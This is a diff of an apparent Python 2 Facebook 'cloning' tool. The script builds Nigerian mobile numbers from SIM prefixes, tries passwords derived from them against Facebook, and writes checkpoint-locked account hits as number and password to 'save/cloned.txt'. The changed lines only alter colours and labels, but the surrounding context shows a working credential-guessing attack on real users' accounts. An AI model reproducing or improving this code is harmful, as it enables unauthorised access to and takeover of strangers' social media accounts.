@@ -169,10 +169,10 @@ def action():
         os.system("clear")
         print logo2
         print "Enter any Nigerian Mobile code Number"+'\n'
-        print '\x1b[1;91mEnter any SIM codes for Nigerians >> 907, 906, 706, 710, 714, 811, 911'
+        print '\x1b[1;94mEnter any SIM codes for Nigerians >> 907, 906, 706, 710, 714, 811, 911'
         
         try:
-            c = raw_input("\033[1;97mGUPTA➤")
+            c = raw_input("\033[1;94mGUPTA---➤")
             k="+234"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
@@ -246,7 +246,7 @@ def action():
                                 oks.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m(\x1b[1;93mGUPTA-CP) ' + k + c + user + '  |  ' + pass3 
+                                    print '\033[1;97m(\x1b[1;93mcp) ' + k + c + user + '  |  ' + pass3 
                                     cps = open('save/cloned.txt', 'a')
                                     cps.write(k+c+user+pass3+'\n')
                                     cps.close()
